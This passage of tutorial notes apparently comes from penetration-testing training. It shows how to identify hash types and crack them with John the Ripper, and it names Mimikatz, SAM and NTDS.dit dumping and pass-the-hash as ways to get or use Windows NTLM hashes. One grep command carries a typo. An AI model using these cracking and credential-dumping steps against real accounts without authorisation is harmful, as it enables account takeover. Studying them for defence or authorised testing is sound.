> Sometimes John won't play nicely with automatically recognizing and loading hashes, and thats okay. 

We're able to use other tools to identify the hash, and then set john to use a specific format. 

There are multiple ways to do this, such as using an online hash identifier like [this](https://hashes.com/en/tools/hash_identifier) one. 

I like to use a tool called [hash-identifier](https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master), a Python tool that is super easy to use and will tell you what different types of hashes the one you enter is likely to be, giving you more options if the first one fails.

To use **hash-identifier**, you can just pull the python file from gitlab using `wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py`

Then simply launch it with `python3 hash-id.py`, then enter the hash you're trying to identify and it will give you possible formats.

### Format-Specific Cracking

> Once you have identified the hash that you're dealing with, you can tell john to use it while cracking the provided hash using the following syntax:

`john --format=[format] --wordlist=[path to wordlist] [path to file]`

`--format=` - This is the flag to tell John that you're giving it a hash of a specific format, and to use the following format to crack it.

`[format]` - the format that the hash is in

**Example Usage**:

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt

**A Note on Formats:**

When you are telling John to use formats, if you're dealing with a standard hash type, e.g. md5 as in the example above, you have to prefix it with `raw-` to tell john you're just dealing with a standard hash type, though this doesn't always apply.

To check if you need to add the prefix or not, you can list all of John's formats using `john --list=formats` and either check manually, or grep for your hash type using something like `john --list=formats |grep =iF "md5"`

### Cracking Windows Authentication Hashes

> Now that we understand the basic syntax and usage of John the Ripper, let's move on to cracking something a little bit more difficult, something you may even want to attempt if you're on a real Penetration Test or Red Team engagement.

**Authentication Hashes** are the hashed versions of passwords that are stored by operating systems, it is sometimes possible to crack them using the brute force methods that we're using.

To get your hands on these hashes, you must often already be a privileged user - so we will explain some of the hashes that we plan on cracking as we attempt them.

#### NTHash / NTLM

**NThash** is the hash format that modern Windows Operating System machines will store user and service passwords in. It's also commonly referred to as **NTLM** which references the previous version of Windows format for hashing passwords known as "LM", thus "NT/LM".

The **NT** designation for Windows products originally meant "New Technology", and was used starting with Windows NT, to dente products that were not built up from the MS-DOS Operating System. Eventually, the "NT" line became the standard Operating System type to be release by Microsoft and the name was dropped, but it still lives on in the names of some Microsoft Technologies.

> You can acquire NTHash/NTLM hashes by dumping the SAM database on a Windows machine, by using a tool like Mimikatz or from the Active Directory database: **NTDS.dit**. 
> 	You may not have to crack the hash to continue privilege escalation - as you can often conduct a "pass the hash" attack instead, but sometimes hash cracking is a viable option if there is a weak password policy.




